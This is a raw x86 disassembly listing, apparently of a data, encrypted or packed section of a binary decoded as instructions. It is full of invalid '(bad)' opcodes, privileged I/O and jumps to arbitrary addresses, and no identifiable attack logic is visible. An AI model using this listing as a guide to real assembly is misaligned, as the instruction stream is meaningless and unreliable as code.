  421e1d:	ret    0xe355
  421e20:	or     eax,0xa1464902
  421e25:	push   eax
  421e26:	mov    ds:0x75daeafd,eax
  421e2b:	in     al,0xdd
  421e2d:	sbb    DWORD PTR [esi],ebp
  421e2f:	outs   dx,BYTE PTR ds:[esi]
  421e30:	(bad)  
  421e31:	cld    
  421e32:	(bad)  
  421e33:	push   ds
  421e34:	push   es
  421e35:	push   eax
  421e36:	sub    edx,DWORD PTR [ecx+0x333de9fd]
  421e3c:	pop    es
  421e3d:	or     DWORD PTR [edi+0x71],eax
  421e40:	and    BYTE PTR [ebx+0x37],al
  421e43:	nop
  421e44:	fwait
  421e45:	aas    
  421e46:	leave  
  421e47:	pop    esi
  421e48:	scas   eax,DWORD PTR es:[edi]
  421e49:	and    DWORD PTR [edi+eiz*8+0x485d00a],ecx
  421e50:	mov    cl,0x4c
  421e52:	test   eax,0xcc2bb19e
  421e57:	pop    esi
  421e58:	lock enter 0xfd58,0x36
  421e5d:	inc    edx
  421e5e:	push   ds
  421e5f:	or     cl,BYTE PTR [ebx+0x2854af14]
  421e65:	or     bh,BYTE PTR [ebp+0x1d690172]
  421e6b:	ds jb  0x421e3b
  421e6e:	jge    0x421df7
  421e70:	xor    al,0x9d
  421e72:	repnz fidivr DWORD PTR [edi-0x64]
  421e76:	outs   dx,BYTE PTR ds:[esi]
  421e77:	jne    0x421eb9
  421e79:	xlat   BYTE PTR ds:[ebx]
  421e7a:	adc    al,0xa5
  421e7c:	pop    edx
  421e7d:	inc    ebx
  421e7e:	dec    edi
  421e7f:	adc    eax,0x83f56383
  421e84:	jecxz  0x421f01
  421e86:	jb     0x421e91
  421e88:	lods   al,BYTE PTR ds:[esi]
  421e89:	adc    cl,bh
  421e8b:	dec    eax
  421e8c:	sub    al,0xd3
  421e8e:	mov    al,0x82
  421e90:	ja     0x421ec4
  421e92:	ins    DWORD PTR es:[edi],dx
  421e93:	lods   al,BYTE PTR ds:[esi]
  421e94:	mov    ch,0xe9
  421e96:	mov    fs,WORD PTR [ecx+0x5a8ed3f2]
  421e9c:	xchg   ebp,eax
  421e9d:	dec    ebx
  421e9e:	pushf  
  421e9f:	mov    edx,0xcc0073ff
  421ea4:	div    DWORD PTR [ebx-0x2d]
  421ea7:	aad    0x6b
  421ea9:	push   ss
  421eaa:	out    0xeb,eax
  421eac:	repnz fnstsw WORD PTR [edx]
  421eaf:	cwde   
  421eb0:	iret   
  421eb1:	push   ds
  421eb2:	mov    dh,0x6d
  421eb4:	adc    al,0xb8
  421eb6:	mov    ah,0x23
  421eb8:	sbb    DWORD PTR [ecx-0x5c],ecx
  421ebb:	stos   DWORD PTR es:[edi],eax
  421ebc:	cmp    ch,dl
  421ebe:	push   esi
  421ebf:	jle    0x421e88
  421ec1:	adc    eax,0xe9f8c513
  421ec6:	and    eax,0x5f0754be
  421ecb:	mov    BYTE PTR ds:0xc1eac9aa,dl
  421ed1:	aaa    
  421ed2:	inc    esp
  421ed3:	or     al,0xab
  421ed5:	fsub   DWORD PTR [edx-0x4d]
  421ed8:	pop    edi
  421ed9:	xchg   ebx,eax
  421eda:	xchg   edx,esi
  421edc:	out    0x94,al
  421ede:	mov    al,ds:0x384754a1
  421ee3:	fidivr WORD PTR [ebx+0x16]
  421ee6:	dec    ecx
  421ee7:	fs ds aas 
  421eea:	fiadd  DWORD PTR [ebx+edx*4+0x11a01df6]
  421ef1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ef2:	fwait
  421ef3:	outs   dx,DWORD PTR ds:[esi]
  421ef4:	jecxz  0x421efe
  421ef6:	add    DWORD PTR [eax-0x1225929b],ebx
  421efc:	add    ebp,DWORD PTR [eax+eiz*4-0x6bd0914b]
  421f03:	aam    0xf5
  421f05:	test   eax,0xc7fcf928
  421f0a:	aam    0x29
  421f0c:	daa    
  421f0d:	and    dh,ch
  421f0f:	add    DWORD PTR [esi],edx
  421f11:	jns    0x421f52
  421f13:	ret    
  421f14:	repnz add eax,0xf1d6a443
  421f1a:	or     eax,0x54887ac5
  421f1f:	das    
  421f20:	(bad)  
  421f22:	pusha  
  421f23:	ret    0xc781
  421f26:	pop    ebp
  421f27:	push   esp
  421f28:	leave  
  421f29:	shr    dh,cl
  421f2b:	push   ss
  421f2c:	ret    0x6b78
  421f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f30:	cmp    BYTE PTR [ebp*4-0x65cf7576],bl
  421f37:	sbb    ebp,ebp
  421f39:	shr    BYTE PTR [ebx+0x2a26967a],0x2
  421f40:	push   0x76
  421f42:	scas   al,BYTE PTR es:[edi]
  421f43:	(bad)  
  421f44:	dec    esi
  421f45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f46:	repz pop ss
  421f48:	push   ebx
  421f49:	xor    dl,cl
  421f4b:	jle    0x421ef2
  421f4d:	neg    DWORD PTR [eax]
  421f4f:	jmp    0x421f51
  421f51:	inc    esp
  421f52:	dec    ebp
  421f53:	out    0x3b,al
  421f55:	mov    dl,0x62
  421f57:	std    
  421f58:	repnz pop edi
  421f5a:	xchg   edx,edi
  421f5c:	push   edx
  421f5d:	or     eax,0xc483ddb1
  421f62:	gs int3 
  421f64:	mov    esi,0x4c46fd9
  421f69:	in     al,0x59
  421f6b:	sub    edx,DWORD PTR [ebx]
  421f6d:	scas   eax,DWORD PTR es:[edi]
  421f6e:	loope  0x421ef1
  421f70:	fistp  DWORD PTR [edx+esi*4-0x1065fd1c]
  421f77:	inc    esp
  421f78:	fwait
  421f79:	xor    esp,DWORD PTR [esi]
  421f7b:	sbb    ebx,DWORD PTR [ecx]
  421f7d:	pop    ds
  421f7e:	and    ch,BYTE PTR [ebx]
  421f80:	das    
  421f81:	pop    ecx
  421f82:	lds    eax,FWORD PTR [eax]
  421f84:	and    bl,BYTE PTR [esi]
  421f86:	into   
  421f87:	mov    ah,0x8b
  421f89:	mov    ch,BYTE PTR [edx]
  421f8b:	pop    esi
  421f8c:	nop
  421f8d:	dec    edi
  421f8e:	dec    edi
  421f8f:	cmc    
  421f90:	xor    eax,0x202f8443
  421f95:	lods   al,BYTE PTR ds:[esi]
  421f96:	jmp    0x421f8c
  421f98:	fimul  WORD PTR [esi-0x5b43c645]
  421f9e:	cmp    BYTE PTR [ebp+0x9132f38],al
  421fa4:	dec    esp
  421fa5:	mov    BYTE PTR [ebx+0x2019559],cl
  421fab:	xor    al,0x52
  421fad:	mov    eax,0x5a5068f9
  421fb2:	xor    BYTE PTR [esi+0x5e],0x3d
  421fb6:	mov    cl,0x60
  421fb8:	popa   
  421fb9:	iret   
  421fba:	loop   0x421f8b
  421fbc:	sub    dl,cl
  421fbe:	mov    eax,esi
  421fc0:	add    eax,0x67196263
  421fc5:	fbstp  TBYTE PTR [ecx+0xc27a88]
  421fcb:	in     eax,0x8f
  421fcd:	push   ebp
  421fce:	and    eax,0x3e50e30c
  421fd3:	and    eax,edi
  421fd5:	mov    ebx,0xeba63029
  421fda:	call   0xff69:0x4ed1f458
  421fe1:	clc    
  421fe2:	int    0x7b
  421fe4:	mov    ebp,ss
  421fe6:	rol    DWORD PTR [edi-0x1e6e5bb],0xf
  421fed:	mov    ecx,0x55fba2d6
  421ff2:	mov    esp,0x18e70cb7
  421ff7:	mov    cl,0x97
  421ff9:	je     0x422043
  421ffb:	shl    BYTE PTR [ecx-0x2fcf3629],1
  422001:	jmp    0x393fb051
  422006:	pop    edi
  422007:	mov    edx,0xfd8d6945
  42200c:	call   0xa98a0a88
  422011:	xor    al,0xa
  422013:	mov    edi,0xb0455f05
  422018:	out    dx,al
  422019:	fild   QWORD PTR [ecx+0x66]
  42201c:	sbb    al,0x6a
  42201e:	fwait
  42201f:	ret    0x157f
  422022:	pop    eax
  422023:	pop    esi
  422024:	test   eax,0xdd0ee52c
  422029:	sub    al,0xfa
  42202b:	xchg   ebp,eax
  42202c:	jmp    0x284:0x319976c2
  422033:	enter  0xc4ae,0x89
  422037:	mov    ebx,0x3bdda307
  42203c:	xchg   edi,eax
  42203d:	jmp    0x4012500b
  422042:	or     DWORD PTR [eax],eax
  422044:	jns    0x422059
  422046:	(bad)  
  422047:	jle    0x422074
  422049:	(bad)  [esi]
  42204b:	(bad)  
  42204c:	sti    
  42204d:	repnz (bad) 
  42204f:	outs   dx,BYTE PTR ds:[esi]
  422050:	ins    DWORD PTR es:[edi],dx
  422051:	and    esi,ebp
  422053:	js     0x4220b4
  422055:	jns    0x422002
  422057:	dec    esp
  422058:	cmp    BYTE PTR [ebx],dh
  42205a:	mov    eax,ebp
  42205c:	sbb    eax,0x1b1f3a63
  422061:	jo     0x422068
  422063:	arpl   WORD PTR [ebx+0x9],cx
  422066:	push   es
  422067:	mov    edi,DWORD PTR [ebp+0x5d]
  42206a:	mov    BYTE PTR [ebp+0x3a],bh
  42206d:	mov    esi,0xbe872207
  422072:	cmp    eax,0xeed7be69
  422077:	call   0x67c73662
  42207c:	ss ds jg 0x422049
  422080:	dec    ecx
  422081:	jl     0x42205c
  422083:	loop   0x4220c2
  422085:	push   cs
  422086:	(bad)  
  422087:	sbb    eax,0x7c59560a
  42208c:	mov    ecx,0x7fc2907
  422091:	xor    ah,BYTE PTR [ebx+esi*8]
  422094:	test   BYTE PTR [ebx+0x34f41dc7],ch
  42209a:	push   edi
  42209b:	ins    DWORD PTR es:[edi],dx
  42209c:	pop    es
  42209d:	sahf   
  42209e:	dec    ebp
  42209f:	mov    ah,BYTE PTR [ebp+0x1c388636]
  4220a5:	cmp    edi,edi
  4220a7:	xor    DWORD PTR [eax],ebp
  4220a9:	push   0x1eb1f839
  4220ae:	stos   BYTE PTR es:[edi],al
  4220af:	jo     0x4220e0
  4220b1:	xor    eax,0x8d8c0dc6
  4220b6:	jmp    0x174da93f
  4220bb:	repnz cmc 
  4220bd:	(bad)  
  4220be:	dec    ebp
  4220bf:	sbb    eax,0x9677fa79
  4220c4:	out    0x2c,al
  4220c6:	and    BYTE PTR [edi+0x4e],ch
  4220c9:	mov    ecx,esp
  4220cb:	mov    WORD PTR cs:[edi-0x77],es
  4220cf:	sbb    ebp,DWORD PTR [ebx]
  4220d1:	test   BYTE PTR [ebx],dl
  4220d3:	pushf  
  4220d4:	pop    edi
  4220d5:	mov    ah,0xa5
  4220d7:	inc    DWORD PTR [ecx-0x1fdda63c]
  4220dd:	push   ds
  4220de:	adc    eax,esi
  4220e0:	into   
  4220e1:	mov    ebx,0x621a6926
  4220e6:	add    al,0xb7
  4220e8:	adc    ah,BYTE PTR [edx-0x7cba9411]
  4220ee:	jbe    0x422114
  4220f0:	push   0xffffffd4
  4220f2:	mov    cl,0xe6
  4220f4:	daa    
  4220f5:	cmp    ebx,DWORD PTR [ebx]
  4220f7:	jmp    0xd83cd11c
  4220fc:	mov    ebp,0x899d85bb
  422101:	xchg   edi,eax
  422102:	shl    BYTE PTR [eax-0x1e],1
  422105:	loop   0x422117
  422107:	jmp    0x422163
  422109:	inc    eax
  42210a:	nop
  42210b:	dec    esi
  42210c:	sub    BYTE PTR [esi+ecx*1+0x64283847],al
  422113:	xor    BYTE PTR [eax],bl
  422115:	(bad)  
  422117:	out    0xd9,al
  422119:	mov    esi,DWORD PTR [ebx]
  42211b:	das    
  42211c:	push   ebp
  42211d:	mov    ah,0xe4
  42211f:	std    
  422120:	ret    
  422121:	xchg   edi,eax
  422122:	dec    esp
  422123:	jnp    0x422197
  422125:	xchg   ebp,eax
  422126:	mov    cs,WORD PTR [ecx]
  422128:	sub    esp,ecx
  42212a:	outs   dx,DWORD PTR ds:[esi]
  42212b:	add    ecx,ebx
  42212d:	push   ecx
  42212e:	dec    esi
  42212f:	inc    edi
  422130:	pushf  
  422131:	or     DWORD PTR [esi+0x6a],0xffffffa5
  422135:	data16 adc BYTE PTR [eax],al
  422138:	loopne 0x422123
  42213a:	cli    
  42213b:	mov    cl,0x8e
  42213d:	dec    ecx
  42213e:	nop
  42213f:	call   0x8f86:0x69063d17
  422146:	sti    
  422147:	adc    BYTE PTR [edx-0x4],bl
  42214a:	and    BYTE PTR [edi+0x33],ch
  42214d:	dec    ecx
  42214e:	cmp    al,0x6a
  422150:	or     ebx,esp
  422152:	jmp    0x4221ad
  422154:	and    ch,BYTE PTR [edi+0x61a82e49]
  42215a:	dec    edi
  42215b:	lahf   
  42215c:	or     ah,BYTE PTR [ecx+eiz*8-0x6f0107bf]
  422163:	inc    edi
  422164:	and    eax,0x9d5fee8c
  422169:	sub    eax,0xbed307ed
  42216e:	into   
  42216f:	std    
  422170:	jne    0x42210a
  422172:	mov    dh,BYTE PTR [ecx]
  422174:	jns    0x42214b
  422176:	pop    ebp
  422177:	loop   0x422143
  422179:	clc    
  42217a:	xor    ecx,edx
  42217c:	mov    BYTE PTR [esi+edi*8+0x6d1ad4d0],bl
  422183:	or     al,0xed
  422185:	jne    0x4221e7
  422187:	cdq    
  422188:	adc    BYTE PTR [edi+esi*4],0x48
  42218c:	ds mov dh,0xeb
  42218f:	fst    QWORD PTR [esp+ebp*4+0x4409b1ed]
  422196:	xchg   edx,eax
  422197:	pop    es
  422198:	sahf   
  422199:	std    
  42219a:	xlat   BYTE PTR ds:[ebx]
  42219b:	sbb    edx,DWORD PTR [ecx]
  42219d:	fmul   DWORD PTR [edi+0x45]
  4221a0:	mov    dh,0xc7
  4221a2:	outs   dx,BYTE PTR ds:[esi]
  4221a3:	rcl    BYTE PTR [ecx],0x22
  4221a6:	out    dx,al
  4221a7:	add    al,0x6a
  4221a9:	clc    
  4221aa:	mov    ecx,0xbbf0966b
  4221b0:	iret   
  4221b1:	in     al,dx
  4221b2:	hlt    
  4221b3:	push   es
  4221b4:	clc    
  4221b5:	popf   
  4221b6:	mov    BYTE PTR [ebx+0x14],dh
  4221b9:	adc    ebp,DWORD PTR [eax+0xf]
  4221bc:	shr    esi,cl
  4221be:	out    0xce,eax
  4221c0:	add    cl,0xf2
  4221c3:	add    al,0x8d
  4221c5:	jmp    0x8c34:0x70e25cd8
  4221cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221cd:	cmp    BYTE PTR [eax],dh
  4221cf:	jb     0x4221ad
  4221d1:	mov    cl,0x67
  4221d3:	out    0xb7,al
  4221d5:	xchg   ebp,eax
  4221d6:	push   ebp
  4221d7:	repz push ss
  4221d9:	push   edi
  4221da:	xor    eax,0x3d740dec
  4221df:	and    BYTE PTR [ebp+0x2],cl
  4221e2:	hlt    
  4221e3:	ins    BYTE PTR es:[edi],dx
  4221e4:	pushf  
  4221e5:	cmp    BYTE PTR [edx-0x4],ah
  4221e8:	pushf  
  4221e9:	test   BYTE PTR es:[ecx+ecx*2],bh
  4221ed:	jg     0x42221a
  4221ef:	jecxz  0x422244
  4221f1:	daa    
  4221f2:	stc    
  4221f3:	in     eax,dx
  4221f4:	not    BYTE PTR [edi+edi*4+0x45bea6b]
  4221fb:	scas   eax,DWORD PTR es:[edi]
  4221fc:	call   DWORD PTR [edx+0x638b6c3c]
  422202:	xor    BYTE PTR [eax],dl
  422204:	cwde   
  422205:	mov    ah,0x6f
  422207:	pusha  
  422208:	pop    ds
  422209:	fucomi st,st(6)
  42220b:	jne    0x4221ac
  42220d:	out    dx,al
  42220e:	and    DWORD PTR [edi-0x37b6c4b5],edx
  422214:	sbb    ch,BYTE PTR [ecx]
  422216:	sub    BYTE PTR ds:[edx+0x66],dl
  42221a:	rcr    BYTE PTR fs:[ecx],1
  42221d:	loop   0x4221dd
  42221f:	mov    eax,ds:0x58207f8e
  422224:	retf   0xb9dd
  422227:	xchg   edx,eax
  422228:	cmp    al,0x18
  42222a:	inc    eax
  42222b:	adc    eax,0xe297ae06
  422230:	or     al,0x47
  422232:	ffreep st(4)
  422234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422235:	xchg   ebx,eax
  422236:	cmp    ah,BYTE PTR [ebx+0x76]
  422239:	push   cs
  42223a:	cmp    edx,eax
  42223c:	mov    eax,ds:0x8e5cf3f
  422241:	sub    DWORD PTR [edx-0x7e589a3b],0xa592a051
  42224b:	mov    ah,0x6f
  42224d:	mov    edx,0x35e87e05
  422252:	mov    dh,0xa4
  422254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422255:	(bad)  [eax-0x36]
  422258:	xor    bh,BYTE PTR [edi]
  42225a:	pop    ds
  42225b:	mov    ds:0x47e84f8,al
  422260:	pop    esi
  422261:	jno    0x4222be
  422263:	out    dx,eax
  422264:	test   BYTE PTR [edx+0x46],bl
  422267:	adc    BYTE PTR [ecx-0x3a41ca9f],bh
  42226d:	xchg   ebp,eax
  42226e:	scas   al,BYTE PTR es:[edi]
  42226f:	inc    esp
  422270:	xchg   DWORD PTR [edx-0x37],edx
  422273:	rcl    DWORD PTR [edi],1
  422275:	jne    0x4222cf
  422277:	push   ds
  422278:	ss jmp 0x9cf15f89
  42227e:	xchg   al,al
  422280:	inc    edx
  422281:	sub    eax,0xa27974c
  422286:	mov    cl,0x7
  422288:	push   0x90ff9a9e
  42228d:	mov    ds:0x38799b15,al
  422292:	sub    ebp,ebx
  422294:	jmp    FWORD PTR [eax+0x5a0dc888]
  42229a:	push   eax
  42229b:	add    esp,DWORD PTR [edi-0x20dd4793]
  4222a1:	clc    
  4222a2:	fwait
  4222a3:	sahf   
  4222a4:	in     eax,0x95
  4222a6:	cmp    esi,0x34
  4222a9:	in     eax,0x8c
  4222ab:	pop    ebp
  4222ac:	lods   eax,DWORD PTR ds:[esi]
  4222ad:	adc    eax,0xa057b0f6
  4222b2:	mov    al,ds:0x1ba93f91
  4222b7:	and    DWORD PTR [edx+0x6a7cc8c],0x6bb3b7b1
  4222c1:	inc    edi
  4222c2:	pop    esp
  4222c3:	gs jnp 0x422258
  4222c6:	fwait
  4222c7:	iret   
  4222c8:	cs mov edx,0x9f6f6ee6
  4222ce:	mov    cl,0x2b
  4222d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222d1:	pop    eax
  4222d2:	loopne 0x42229e
  4222d4:	pop    eax
  4222d5:	push   edi
  4222d6:	(bad)  
  4222d7:	cs es nop
  4222da:	js     0x42225d
  4222dc:	mov    al,BYTE PTR [esi+0x4c]
  4222df:	ss push ecx
  4222e1:	es mov dl,0x92
  4222e4:	popf   
  4222e5:	sub    ebx,DWORD PTR [edx+0x9]
  4222e8:	xchg   ebx,eax
  4222e9:	push   esp
  4222ea:	xlat   BYTE PTR ds:[ebx]
  4222eb:	adc    DWORD PTR [ebx+0x1925ac58],eax
  4222f1:	sbb    al,BYTE PTR [esi-0x2a95bc0d]
  4222f7:	mov    ah,0x80
  4222f9:	popa   
  4222fa:	mov    cl,0x86
  4222fc:	cmp    al,0xab
  4222fe:	add    BYTE PTR [eax+0x19cff65c],cl
  422304:	adc    edi,DWORD PTR [edx]
  422306:	outs   dx,BYTE PTR ds:[esi]
  422307:	cwde   
  422308:	or     eax,0x51da16dd
  42230d:	js     0x42229a
  42230f:	out    0x3e,al
  422311:	mov    dl,0x4f
  422313:	sti    
  422314:	xor    bh,al
  422316:	mov    ebp,0xfadac013
  42231b:	mov    eax,ecx
  42231d:	cwde   
  42231e:	cmp    DWORD PTR [esi],edx
  422320:	xor    edi,DWORD PTR [edi+0x39]
  422323:	cwde   
  422324:	test   eax,0xea68b6c1
  422329:	mov    cl,0x9d
  42232b:	add    BYTE PTR [edi*8-0x13c3ccbf],cl
  422332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422333:	pop    eax
  422334:	loopne 0x42233a
  422336:	dec    ebx
  422337:	pusha  
  422338:	data16 icebp 
  42233a:	or     ebp,eax
  42233c:	jb     0x4222f2
  42233e:	inc    ebp
  42233f:	in     al,dx
  422340:	loop   0x422319
  422342:	mov    eax,ds:0xb8a42872
  422347:	xchg   ebp,eax
  422348:	xor    al,0xb7
  42234a:	push   0xbbeee5e
  42234f:	mov    dh,0xd7
  422351:	xor    al,0x2b
  422353:	mov    ebp,0xcb30def2
  422358:	iret   
  422359:	les    ebx,FWORD PTR [eax]
  42235b:	mov    ah,0x96
  42235d:	xchg   ebx,eax
  42235e:	lock dec ecx
  422360:	rcl    BYTE PTR [ebp+0x6],1
  422363:	in     al,dx
  422364:	pushf  
  422365:	push   ebx
  422366:	mov    edx,esp
  422368:	dec    edx
  422369:	jmp    0xe28e:0x744edef1
  422370:	retf   0x376d
  422373:	jmp    0xde4a4c13
  422378:	mov    BYTE PTR [ecx+0x28],dh
  42237b:	add    eax,0xe7fe5627
  422380:	jg     0x422387
  422382:	icebp  
  422383:	adc    esp,DWORD PTR [edx]
  422385:	xchg   edx,eax
  422386:	std    
  422387:	je     0x4223e6
  422389:	cmp    eax,0x41fb8b1b
  42238e:	or     eax,0xe4331cc1
  422393:	fimul  WORD PTR ds:0xa3c4232f
  422399:	scas   al,BYTE PTR es:[edi]
  42239a:	pusha  
  42239b:	push   edi
  42239c:	rcr    BYTE PTR [edi],cl
  42239e:	sub    edx,DWORD PTR [ecx+ecx*4+0xf]
  4223a2:	and    BYTE PTR [ebx-0x2eb75ecf],0xcb
  4223a9:	dec    ebx
  4223aa:	stos   DWORD PTR es:[edi],eax
  4223ab:	pop    ebx
  4223ac:	imul   esp,DWORD PTR ds:0x6c943ea,0xffffffb7
  4223b3:	mov    cl,0x93
  4223b5:	pop    ds
  4223b6:	out    dx,al
  4223b7:	mov    bh,0xec
  4223b9:	neg    BYTE PTR [ecx-0x20]
  4223bc:	repnz mov dl,0x63
  4223bf:	not    BYTE PTR [edi+0x5144dd27]
  4223c5:	and    eax,ebx
  4223c7:	adc    eax,0x22a57638
  4223cc:	jmp    0x3455:0x204125bf
  4223d3:	inc    ecx
  4223d4:	stc    
  4223d5:	xor    bl,ch
  4223d7:	fisttp WORD PTR [eax]
  4223d9:	js     0x4223d2
  4223db:	cld    
  4223dc:	enter  0x6162,0x2b
  4223e0:	jmp    0xd1575c94
  4223e5:	retf   0x6162
  4223e8:	jno    0x42242f
  4223ea:	jbe    0x42243b
  4223ec:	jmp    DWORD PTR [esi-0x76]
  4223ef:	cmc    
  4223f0:	shl    dh,cl
  4223f2:	loopne 0x4223e3
  4223f4:	lods   eax,DWORD PTR ds:[esi]
  4223f5:	and    ebx,edi
  4223f7:	icebp  
  4223f8:	mov    WORD PTR [ecx+0xfda53fb],ds
  4223fe:	sbb    ebp,ecx
  422400:	and    ah,cl
  422402:	ins    DWORD PTR es:[edi],dx
  422403:	push   ss
  422404:	mov    eax,DWORD PTR [eax+ebx*1-0x75]
  422408:	retf   0x8cc3
  42240b:	in     eax,dx
  42240c:	mov    ebp,0x1a3abda6
  422411:	gs retf 0xd97e
  422415:	pushf  
  422416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422417:	add    BYTE PTR [edi-0x30],bh
  42241a:	idiv   bl
  42241c:	or     al,0xa7
  42241e:	jns    0x422464
  422420:	dec    ebx
  422421:	mov    al,ds:0x69e4cfef
  422426:	push   esi
  422427:	cmp    al,0xd5
  422429:	clc    
  42242a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42242b:	mov    bl,0xfe
  42242d:	out    dx,eax
  42242e:	cmp    eax,0xb4ea87a7
  422433:	push   0xb16db7ae
  422438:	mov    al,0x1b
  42243a:	add    al,0x8a
  42243c:	dec    eax
  42243d:	dec    edx
  42243e:	jne    0x42249c
  422440:	sbb    ah,ah
  422442:	ret    0xe399
  422445:	mov    edi,0xa916399b
  42244a:	sbb    eax,0x4147d5cd
  42244f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422450:	cli    
  422451:	cmp    eax,0xf5de2d9f
  422456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422457:	mov    ecx,0x62e4701a
  42245c:	push   edi
  42245d:	rcr    ecx,cl
  42245f:	mov    ah,0x38
  422461:	js     0x422415
  422463:	outs   dx,DWORD PTR ds:[esi]
  422464:	mov    edx,0x3c4bf323
  422469:	mov    ecx,0xc1d91f5d
  42246e:	into   
  42246f:	dec    edx
  422470:	out    0x33,al
  422472:	jecxz  0x4223f9
  422474:	jle    0x422476
  422476:	call   0x6b8419bc
  42247b:	mov    ds:0x966ef044,al
  422480:	sbb    eax,0x22c4fb3c
  422485:	jmp    DWORD PTR [ebp+0x44]
  422488:	pop    ebx
  422489:	std    
  42248a:	add    al,0x9d
  42248c:	iret   
  42248d:	push   0xffffffe3
  42248f:	in     al,0xa8
  422491:	and    al,0x4
  422493:	pop    ebx
  422494:	and    al,0x76
  422496:	rcl    BYTE PTR [bx+si-0x53],cl
  42249a:	mov    esi,0x813aaf58
  42249f:	mov    eax,0xca287636
  4224a4:	push   ebp
  4224a5:	gs dec eax
  4224a7:	nop
  4224a8:	xor    cl,bh
  4224aa:	inc    esp
  4224ab:	repz stc 
  4224ad:	stos   BYTE PTR es:[edi],al
  4224ae:	xchg   esi,eax
  4224af:	sbb    dh,BYTE PTR [ecx]
  4224b1:	clc    
  4224b2:	pop    ecx
  4224b3:	jae    0x4224bc
  4224b5:	rcr    esi,1
  4224b7:	out    dx,al
  4224b8:	stos   BYTE PTR es:[edi],al
  4224b9:	(bad)  
  4224ba:	jmp    0x422492
  4224bc:	test   DWORD PTR [edi-0x37],esi
  4224bf:	sub    BYTE PTR [ecx-0x6f2dd32],ah
  4224c5:	out    0xc0,eax
  4224c7:	and    edx,DWORD PTR [ecx+0x78]
  4224ca:	xor    DWORD PTR ds:0x89fc4f64,0x7ca1444b
  4224d4:	jg     0x42249e
  4224d6:	pop    eax
  4224d8:	rcl    ecx,0x8d
  4224db:	cmc    
  4224dc:	das    
  4224dd:	test   BYTE PTR [ebx],bh
  4224df:	shl    BYTE PTR [ecx-0x67d873e5],cl
  4224e5:	mov    al,0x77
  4224e7:	jne    0x4224b0
  4224e9:	nop    DWORD PTR [edx+0x405638ca]
  4224f0:	mov    ch,bl
  4224f2:	xor    bh,0xbd
  4224f5:	xchg   edx,eax
  4224f6:	push   ebx
  4224f7:	sahf   
  4224f8:	dec    esp
  4224f9:	add    al,0x15
  4224fb:	ret    0x687c
  4224fe:	cmp    ebp,DWORD PTR [esi+0x6da0b916]
  422504:	mov    al,0xb9
  422506:	add    edx,ebx
  422508:	lods   eax,DWORD PTR ds:[esi]
  422509:	jl     0x42249f
  42250b:	xor    eax,0x1773aa6e
  422510:	fldenv [edx+0x3457affe]
  422516:	(bad)  
  422517:	or     eax,0x88299e7d
  42251c:	sbb    al,0xd9
  42251e:	jae    0x422584
  422520:	cli    
  422521:	test   dl,bl
  422523:	adc    BYTE PTR [ecx-0x42],0x53
  422527:	lock dec ebx
  422529:	jo     0x422550
  42252b:	fmul   QWORD PTR [ebp+0x5b38eefd]
  422531:	jb     0x4225a9
  422533:	fadd   QWORD PTR [edi+0x278b27bf]
  422539:	sbb    al,0x4e
  42253b:	push   0x889e7aae
  422540:	fstp   TBYTE PTR [ebx-0x2caebf9]
  422546:	sbb    edi,DWORD PTR [ebx+edx*8-0x4e8b7edd]
  42254d:	jmp    0xe0280baf
  422552:	adc    BYTE PTR [edx+0x67],bl
  422555:	(bad)  
  422556:	jmp    0xf6e522c1
  42255b:	push   es
  42255c:	stc    
  42255d:	mov    WORD PTR [ebx+0x76],fs
  422560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422561:	mov    al,BYTE PTR [esi]
  422563:	jle    0x422578
  422565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422566:	and    DWORD PTR [ebx],eax
  422568:	std    
  422569:	push   ss
  42256a:	dec    ebx
  42256b:	mov    bl,0xdd
  42256d:	pop    edx
  42256e:	addr16 icebp 
  422570:	sbb    BYTE PTR [edi-0x5760fab9],bl
  422576:	out    0xde,eax
  422578:	inc    esp
  422579:	lock mov dl,0xc1
  42257c:	dec    edi
  42257d:	nop
  42257e:	add    cl,BYTE PTR [eax]
  422580:	cld    
  422581:	je     0x4225a3
  422583:	nop
  422584:	clc    
  422585:	and    bl,dl
  422587:	pop    ecx
  422588:	add    esi,DWORD PTR ds:0xb571fc5a
  42258e:	jb     0x422541
  422590:	cmp    esi,DWORD PTR [ebx-0x15a0decb]
  422596:	repz and al,0x3d
  422599:	ja     0x422585
  42259b:	xchg   esi,eax
  42259c:	outs   dx,DWORD PTR ds:[esi]
  42259d:	or     dl,BYTE PTR [ecx-0x25cdb0b6]
  4225a3:	mov    DWORD PTR [ecx-0x1ce1274],edi
  4225a9:	daa    
  4225aa:	pop    ds
  4225ab:	xchg   esi,eax
  4225ac:	sar    ah,0x68
  4225af:	idiv   BYTE PTR [ecx]
  4225b1:	test   DWORD PTR ds:0x486054c7,0xd13032d9
  4225bb:	sub    eax,0x9c9f2c46
  4225c0:	xor    edi,DWORD PTR [ecx+esi*4+0x7a]
  4225c4:	xchg   edi,eax
  4225c5:	ret    0xbb44
  4225c8:	into   
  4225c9:	mov    ah,0x18
  4225cb:	xchg   edi,eax
  4225cc:	xchg   DWORD PTR [ebp-0x2f],ecx
  4225cf:	sahf   
  4225d0:	or     cl,BYTE PTR [eax-0x68ab45fb]
  4225d6:	push   ss
  4225d7:	push   bp
  4225d9:	jb     0x422642
  4225db:	shl    esi,0x1e
  4225de:	clc    
  4225df:	jne    0x422593
  4225e1:	mov    bl,0x6c
  4225e3:	mov    ah,0x3a
  4225e5:	mov    dh,BYTE PTR [edx-0x7a323c48]
  4225eb:	loopne 0x42261c
  4225ed:	add    eax,0xd3828cd
  4225f2:	push   ss
  4225f3:	adc    DWORD PTR [ecx],0xffffff9b
  4225f6:	xor    bh,BYTE PTR [edx+0x1458594f]
  4225fc:	cmp    DWORD PTR [esi],edi
  4225fe:	xor    DWORD PTR ds:0xbf0ab486,ebx
  422604:	(bad)  
  422606:	out    0x86,al
